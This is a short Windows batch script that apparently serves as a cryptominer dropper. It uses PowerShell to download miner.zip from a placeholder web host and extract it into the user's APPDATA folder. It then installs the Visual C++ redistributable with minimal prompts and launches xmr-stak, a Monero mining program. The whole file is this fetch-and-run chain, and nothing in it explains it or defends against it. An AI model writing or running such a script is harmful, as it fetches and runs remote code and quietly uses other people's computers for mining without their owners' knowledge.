@echo off
powershell -command "Invoke-WebRequest 'https://website/miner.zip' -OutFile 'miner.zip'; Expand-Archive .\miner.zip  -DestinationPath $env:APPDATA"
cd minero
.\VC_redist.x64.exe /passive /norestart
.\xmr-stak.exe
